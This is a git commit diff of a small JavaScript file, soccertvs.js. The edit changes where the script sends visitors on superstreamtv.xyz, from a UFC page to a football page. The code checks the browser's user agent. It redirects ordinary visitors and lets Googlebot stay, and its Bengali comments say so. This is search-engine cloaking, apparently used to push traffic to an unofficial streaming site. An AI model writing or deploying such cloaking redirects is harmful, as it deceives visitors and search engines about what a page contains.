45f99f9ac963f8abe4a05fb0b5344a1b5f6d70a2
jsojib <jsojib25@gmail.com>
2026-08-29 01:23:44 +0600

    Update soccertvs.js

--- soccertvs.js
+++ soccertvs.js
@@ -1,6 +1,6 @@
 if (!navigator.userAgent.includes('Googlebot')) {
   // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
-  window.location.href = "https://superstreamtv.xyz/ufc/";
+  window.location.href = "https://superstreamtv.xyz/football/";
 } else {
   // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
   console.log("Thanks for visiting my page" );
